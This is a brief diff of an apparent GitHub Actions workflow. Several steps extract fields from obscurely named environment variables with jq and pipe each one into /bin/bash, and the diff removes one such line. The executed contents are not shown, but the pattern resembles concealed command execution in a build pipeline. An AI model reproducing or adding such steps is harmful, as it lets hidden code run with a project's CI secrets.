@@ -28,7 +28,6 @@ jobs:
           echo $phjy8 | jq -r .c8 | /bin/bash
           echo $t1 | jq -r .sxhv82 | /bin/bash
           echo $mt851 | jq -r .qi2 | /bin/bash
-          printf '%s' "$izdr26" | jq -r .yyqu96534 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
